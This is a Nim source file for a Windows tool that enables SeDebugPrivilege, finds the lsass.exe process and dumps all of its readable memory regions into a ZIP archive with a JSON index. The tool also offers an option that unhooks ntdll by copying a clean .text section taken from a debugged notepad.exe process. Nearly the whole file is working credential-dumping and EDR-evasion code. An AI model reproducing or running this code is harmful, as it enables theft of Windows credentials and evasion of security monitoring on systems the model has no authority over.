import winim/lean
import strformat
import strutils
import zippy/ziparchives
import tables
import parseopt


const
  MAX_MEMFILES = 1024

type
  MemFile* = object
    filename*: string
    content*: ptr UncheckedArray[byte]
    size*: csize_t

type
  Luid* = object
    lowPart*: DWORD
    highPart*: DWORD

  TokenPrivileges* = object
    privilegeCount*: DWORD
    luid*: Luid
    attributes*: DWORD

type MEMORY_INFORMATION_CLASS* = enum
    MemoryBasicInformation = 0


proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
proc NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
proc NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
proc NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesRead: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
proc NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MEMORY_INFORMATION_CLASS, MemoryInformation: PVOID, MemoryInformationLength: SIZE_T, ReturnLength: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}
proc NtRemoveProcessDebug*(ProcessHandle: HANDLE, DebugObjectHandle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtRemoveProcessDebug".}
proc NtTerminateProcess*(ProcessHandle: HANDLE, ExitStatus: NTSTATUS): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtTerminateProcess".}
proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtWriteVirtualMemory".}
proc NtProtectVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: ptr PVOID, RegionSize: ptr SIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtProtectVirtualMemory".}


proc enableDebugPrivileges*() =
  let currentProcess = cast[HANDLE](-1)
  var tokenHandle: HANDLE

  # Open process token
  let openStatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES, addr tokenHandle)
  if openStatus != 0:
    echo "[-] NtOpenProcessToken failed. NTSTATUS: 0x", toHex(cast[int32](openStatus), 8)
    quit(-1)

  # Prepare privilege structure
  var tp = TokenPrivileges(
    privilegeCount: 1,
    luid: Luid(lowPart: 20, highPart: 0),
    attributes: SE_PRIVILEGE_ENABLED
  )

  # Adjust token privileges
  let adjustStatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if adjustStatus != 0:
    echo "[-] NtAdjustPrivilegesToken failed. NTSTATUS: 0x", toHex(cast[int32](adjustStatus), 8)
    NtClose(tokenHandle)
    quit(-1)

  # Cleanup
  NtClose(tokenHandle)

  echo "[+] SeDebugPrivilege successfully enabled"


proc readRemoteIntPtr*(hProcess: HANDLE, memAddress: PVOID): PVOID =
    var
        buff: array[8, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    # Allowed status codes: SUCCESS (0), ACCESS_VIOLATION (0xC0000005), INVALID_PARAMETER (0x8000000D)
    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteIntPtr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"
        return nil
    
    result = cast[PVOID](cast[ptr int64](addr buff[0])[])


proc readRemoteWStr*(hProcess: HANDLE, memAddress: PVOID): string =
    var
        buff: array[256, BYTE]
        bytesRead: SIZE_T
    
    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteWStr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"

    var unicodeStr = ""
    var i = 0
    while i < sizeof(buff) - 1:
        if buff[i] == 0 and buff[i+1] == 0:
            break
        
        let wch = cast[ptr WCHAR](addr buff[i])[]
        unicodeStr.add(char(wch))
        i += 2
    
    return unicodeStr


proc getProcNameFromHandle*(processHandle: HANDLE): string =
    const
        ProcessBasicInformationSize = 48
        PebOffset = 0x8
        CommandLineOffset = 0x68
        ProcessParametersOffset = 0x20

    var
        pbiByteArray: array[ProcessBasicInformationSize, BYTE]
        returnLength: ULONG

    # Query process information
    let ntstatus = NtQueryInformationProcess(
        processHandle,
        0.PROCESSINFOCLASS,
        cast[PVOID](addr pbiByteArray[0]),
        ProcessBasicInformationSize.ULONG,
        addr returnLength
    )

    if ntstatus != 0:
        echo fmt"[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{cast[int](ntstatus):08X}"
        return ""

    # Rest of the implementation remains the same...
    # Get PEB Base Address
    let pebPointer = cast[PVOID](cast[uint](addr pbiByteArray[0]) + PebOffset)
    let pebAddress = cast[PVOID](cast[ptr PVOID](pebPointer)[])

    # Get PEB->ProcessParameters
    let processParametersPointer = cast[PVOID](cast[uint](pebAddress) + ProcessParametersOffset)

    # Get ProcessParameters->CommandLine
    let processParametersAddress = readRemoteIntPtr(processHandle, processParametersPointer)
    let commandLinePointer = cast[PVOID](cast[uint](processParametersAddress) + CommandLineOffset)
    let commandLineAddress = readRemoteIntPtr(processHandle, commandLinePointer)
    let commandLineValue = readRemoteWStr(processHandle, commandLineAddress)

    return commandLineValue


proc toLowercase*(str: var string) =
    ## Converts a string to lowercase in-place (modifies original)
    for i in 0..<str.len:
        str[i] = str[i].toLowerAscii()


proc getProcessByName*(procName: string): HANDLE =
    let targetName = procName.toLowerAscii()  # Use Nim's built-in
    
    var auxHandle: HANDLE = 0
    while NT_SUCCESS(NtGetNextProcess(auxHandle, MAXIMUM_ALLOWED, 0, 0, addr auxHandle)):
        let currentName = getProcNameFromHandle(auxHandle).toLowerAscii()
        if currentName == targetName:
            return auxHandle
    return 0


proc GenerateZip*(zipFilename: string, memfiles: openArray[MemFile]) =
  ## Crea un ZIP a partir de archivos en memoria usando Zippy (createZipArchive)
  try:
    var files = initTable[string, string]()

    for memfile in memfiles:
      if not memfile.content.isNil and memfile.size > 0:
        let filename = memfile.filename
        if filename.len > 0:
          var data = newString(memfile.size)
          copyMem(addr data[0], memfile.content, memfile.size)
          files[filename] = data

    let zipData = createZipArchive(files)
    writeFile(zipFilename, zipData)

    echo "[+] File ", zipFilename, "  generated correctly"
  except:
    echo "[-] Error al generar el ZIP"


proc barrel*(jsonFile: string, zipFile: string) =
  enableDebugPrivileges()
  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
  if hProcess == 0:
    quit(-1)

  # Initialize scan variables
  var
    memfileList: array[MAX_MEMFILES, MemFile]
    memfileCount = 0
    jsonOutput = "["
    procMaxAddress = 0x7FFFFFFEFFFF'u64
    memAddress: PVOID = nil

  while cast[uint64](memAddress) < procMaxAddress:
    var mbi: MEMORY_BASIC_INFORMATION
    var returnSize: SIZE_T

    let ntstatus = NtQueryVirtualMemory(
        hProcess,
        memAddress,
        MemoryBasicInformation,
        addr mbi,
        sizeof(mbi).SIZE_T,
        addr returnSize
    )
    
    if ntstatus != 0:
        echo fmt"[-] Error NtQueryVirtualMemory: 0x{ntstatus:X}"
        break

    if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
        let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
        
        let regionSize = mbi.RegionSize
        let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
        var bytesRead: SIZE_T = 0

        ### echo fmt"[+] Dumping {filename} ({regionSize} bytes)"
        let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
        let unsignedStatus = cast[uint32](status)
        if mbi.Protect == 260 or mbi.Protect == 258:
          echo "bbb"
          echo "status ",status
          echo "unsignedStatus ",unsignedStatus

        const STATUS_SUCCESS = 0x00000000'u32
        const STATUS_PARTIAL_COPY = 0x8000000D'u32

        if unsignedStatus != STATUS_SUCCESS and unsignedStatus != STATUS_PARTIAL_COPY:
            echo fmt"[-] Error reading 0x{cast[int](mbi.BaseAddress):X} (NTSTATUS: 0x{unsignedStatus:08X})"
            dealloc(buffer)
            break

        jsonOutput.add(fmt"""{{"field0":"{filename}","field1":"0X{cast[int](mbi.BaseAddress):X}","field2":{regionSize}}},""")

        ## DEBUG
        var hexBytes = ""
        if regionSize > 0:
            hexBytes = newStringOfCap(36)  # 12 bytes * 3 caracteres (máximo)
            for i in 0..<min(12, regionSize):
                hexBytes.add(fmt"{buffer[i]:02X}")
                if i < min(12, regionSize) - 1:  # Añadir espacio solo entre bytes
                    hexBytes.add(" ")
        #echo fmt"""{{"region":"{filename}","size":{regionSize},"first_bytes":"{hexBytes}"}}"""

        # Create MemFile
        if memfileCount < MAX_MEMFILES:
            memfileList[memfileCount] = MemFile(
                filename: filename,
                content: buffer,
                size: cast[csize_t](regionSize)
            )
            inc memfileCount
        else:
            echo "[-] ¡Lista de MemFiles llena! Omitiendo región."
            dealloc(buffer)

    # Next region
    memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  echo fmt"[+] Number of memory regions: {memfileCount}"

  # Finalize JSON output (remove trailing comma and close array)
  if jsonOutput.len > 1:
    jsonOutput.setLen(jsonOutput.len-2) # Remove last ", "
  jsonOutput.add("}]")
  writeFile(jsonFile, $jsonOutput)
  echo "[+] File ", jsonFile, " generated correctly"

  GenerateZip(zipFile, memfileList)


proc custom_get_module_address*(h_process: HANDLE, module_name: string): uint64 =
    const
        process_basic_information_size = 48'u32
        peb_offset = 0x8
        ldr_offset = 0x18
        in_initialization_order_module_list_offset = 0x30
        flink_dllbase_offset = 0x20
        flink_buffer_offset = 0x50
    
    var
        pbi_byte_array: array[process_basic_information_size, BYTE]
        return_length: ULONG = 0
        ntstatus: NTSTATUS
    
    # Query process information
    ntstatus = NtQueryInformationProcess(
        h_process,
        0.PROCESSINFOCLASS,
        cast[PVOID](addr pbiByteArray[0]), #addr pbi_byte_array[0].PVOID,
        process_basic_information_size.ULONG,
        addr returnLength # addr return_length.PULONG
    )
    
    if ntstatus != 0:
        echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", toHex(cast[int](ntstatus))
        return 0'u64
    
    let peb_pointer = cast[PVOID](cast[uint64](addr pbi_byte_array[0]) + peb_offset)
    let currentProcess = cast[HANDLE](-1)  # 0xffffffff... = -1
    
    # Read PEB address
    var peb_address = cast[uint64](readRemoteIntPtr(currentProcess, peb_pointer))
    if peb_address == 0:
        return 0'u64
    
    # Read LDR address
    let ldr_pointer = cast[PVOID](peb_address + ldr_offset)
    var ldr_address = cast[uint64](readRemoteIntPtr(h_process, ldr_pointer))
    if ldr_address == 0:
        return 0'u64
    
    # Get module list
    let in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
    var next_flink = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](in_initialization_order_module_list)))
    var dll_base = high(uint64)
    
    while dll_base != 0:
        next_flink -= 0x10
        
        # Read DLL base name
        let buffer = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + flink_buffer_offset)))
        var base_dll_name = ""
        
        if buffer != 0:
            base_dll_name = readRemoteWStr(h_process, cast[PVOID](buffer))
        
        if base_dll_name == module_name:
            # Get DLL base address
            dll_base = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + flink_dllbase_offset)))
            return dll_base
        
        next_flink = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + 0x10)))
    
    return 0'u64



proc get_text_section_info*(ntdll_address: PVOID): array[2, uint32] =
    let h_process = cast[HANDLE](-1)
    var e_lfanew_data: array[4, BYTE]
    let e_lfanew_address = cast[PVOID](cast[uint64](ntdll_address) + 0x3C)
    
    var bytesRead: SIZE_T
    discard NtReadVirtualMemory(
        h_process,
        e_lfanew_address,
        addr e_lfanew_data[0],
        4,
        addr bytesRead
    )
    
    let e_lfanew = cast[ptr uint32](addr e_lfanew_data[0])[]
    
    # Calculate NT headers address
    let nt_headers_address = cast[uint64](ntdll_address) + e_lfanew
    let optional_header_address = nt_headers_address + 24
    
    # Read SizeOfCode
    let sizeofcode_address = cast[PVOID](optional_header_address + 4)
    var sizeofcode_data: array[4, BYTE]
    
    discard NtReadVirtualMemory(
        h_process,
        sizeofcode_address,
        addr sizeofcode_data[0],
        sizeof(sizeofcode_data),
        addr bytesRead
    )
    
    let sizeofcode = cast[ptr uint32](addr sizeofcode_data[0])[]
    
    # Read BaseOfCode
    let baseofcode_address = cast[PVOID](optional_header_address + 20)
    var baseofcode_data: array[4, BYTE]
    
    discard NtReadVirtualMemory(
        h_process,
        baseofcode_address,
        addr baseofcode_data[0],
        sizeof(baseofcode_data),
        addr bytesRead
    )
    
    let baseofcode = cast[ptr uint32](addr baseofcode_data[0])[]
    
    # Return the two values as an array
    [baseofcode, sizeofcode]


proc get_ntdll_from_debug_proc*(process_path: string): ptr uint8 =
    var
        si: STARTUPINFOW
        pi: PROCESS_INFORMATION
        debug_object_handle: HANDLE
        return_length: ULONG
        status: NTSTATUS

    # Initialize structures
    zeroMem(addr si, sizeof(si).SIZE_T)
    si.cb = sizeof(si).DWORD
    zeroMem(addr pi, sizeof(pi).SIZE_T)

    # Create process with DEBUG_PROCESS flag
    let success = CreateProcessW(
        newWideCString(process_path),
        nil,
        nil,
        nil,
        false,
        DEBUG_PROCESS,
        nil,
        nil,
        addr si,
        addr pi
    )
    if success == 0:
        let err = GetLastError()
        echo "[-] CreateProcess failed with error: 0x", toHex(err.uint32), " (", err, ")"
        quit(1)

    # Get ntdll.dll information from current process
    let current_process = cast[HANDLE](-1)
    let local_ntdll_handle = custom_get_module_address(current_process, "ntdll.dll")
    if local_ntdll_handle == 0:
        echo "[-] Failed to locate ntdll.dll in current process"
        quit(1)
    let text_section = get_text_section_info(cast[PVOID](local_ntdll_handle))
    let local_ntdll_txt_base = text_section[0]
    let local_ntdll_txt_size = text_section[1]
    let local_ntdll_txt = local_ntdll_handle + local_ntdll_txt_base

    # Read remote ntdll text section
    var ntdll_buffer = newSeq[byte](local_ntdll_txt_size)
    var bytesRead: SIZE_T
    status = NtReadVirtualMemory(
        pi.hProcess,
        cast[PVOID](local_ntdll_txt),
        addr ntdll_buffer[0],
        local_ntdll_txt_size.SIZE_T,
        addr bytesRead
    )
    if status != 0:
        echo "[-] Read operation failed"
        quit(1)

    # Get debug object handle
    status = NtQueryInformationProcess(
        pi.hProcess,
        30.PROCESSINFOCLASS,
        addr debug_object_handle,
        sizeof(debug_object_handle).ULONG,
        addr return_length
    )
    if status != 0:
        echo "[-] Failed to get debug object handle"
        quit(1)

    # Cleanup and terminate debug process
    status = NtRemoveProcessDebug(pi.hProcess, debug_object_handle)
    if status != 0:
        echo "[-] Failed to remove process debug"
        quit(1)
    let terminate_result = NtTerminateProcess(pi.hProcess, 0)
    if terminate_result != 0:
        echo "[-] Failed to terminate process"
        quit(1)

    # Close handles
    let close_handle_proc = NtClose(pi.hProcess)
    let close_handle_thread = NtClose(pi.hThread)
    if close_handle_proc != 0 or close_handle_thread != 0:
        echo "[-] Handle closure failed"
        quit(1)
    result = cast[ptr uint8](addr ntdll_buffer[0])


proc replace_ntdll_txt_section*(unhooked_ntdll_txt: pointer, local_ntdll_txt: pointer, local_ntdll_txt_size: uint32) =
    var
        dw_old_protection: ULONG = 0
        current_process = cast[HANDLE](-1)  # UInt64::MAX equivalent
        region_size = local_ntdll_txt_size.SIZE_T
        status: NTSTATUS

    # First protection change to PAGE_EXECUTE_WRITECOPY
    status = NtProtectVirtualMemory(
        current_process,
        addr local_ntdll_txt,
        addr region_size,
        PAGE_EXECUTE_WRITECOPY,
        addr dw_old_protection
    )
    if status != 0:
        echo "[-] Failed to change memory protection"
        quit(1)

    # Perform the memory copy
    let src = cast[ptr UncheckedArray[byte]](unhooked_ntdll_txt)
    let dst = cast[ptr UncheckedArray[byte]](local_ntdll_txt)
    for i in 0..<local_ntdll_txt_size:
        dst[i] = src[i]
    
    # Restore original protection
    status = NtProtectVirtualMemory(
        current_process,
        addr local_ntdll_txt,
        addr region_size,
        dw_old_protection,
        addr dw_old_protection
    )
    if status != 0:
        echo "[-] Failed to restore memory protection"
        quit(1)


proc remap_library*() =
  let unhookedNtdllTxt = get_ntdll_from_debug_proc("C:\\Windows\\System32\\notepad.exe")
  let currentProcess = cast[HANDLE](-1)
  let localNtdllHandle = custom_get_module_address(currentProcess, "ntdll.dll")

  if localNtdllHandle == 0:
      echo "[-] Failed to get ntdll.dll base address"
      quit(1)

  let text_section = get_text_section_info(cast[PVOID](localNtdllHandle))
  let localNtdllTxtBase = text_section[0]
  let localNtdllTxtSize = text_section[1]
  let localNtdllTxt = cast[pointer](localNtdllHandle + localNtdllTxtBase)  # Convert to pointer

  echo fmt"[+] Replacing 0x{localNtdllTxtSize:X} bytes from 0x{cast[uint64](unhookedNtdllTxt):X} to 0x{cast[uint64](localNtdllTxt):X}"
  replace_ntdll_txt_section(cast[pointer](unhookedNtdllTxt), localNtdllTxt, localNtdllTxtSize.uint32)


proc main() =
  var
    jsonFile = "barrel.json"
    zipFile = "barrel.zip"
    shouldRemap = false

  for kind, key, val in getopt():
    case kind
    of cmdArgument:
      discard  # Handle positional arguments if needed
    of cmdLongOption, cmdShortOption:
      case key
      of "j", "json":
        if val.len > 0:
          jsonFile = val
      of "z", "zip":
        if val.len > 0:
          zipFile = val
      of "r", "remap":
        shouldRemap = true
      else:
        echo "Unknown option: ", key
        quit(1)
    of cmdEnd:
      discard

  if shouldRemap:
    remap_library()
  barrel(jsonFile, zipFile)


when isMainModule:
  main()
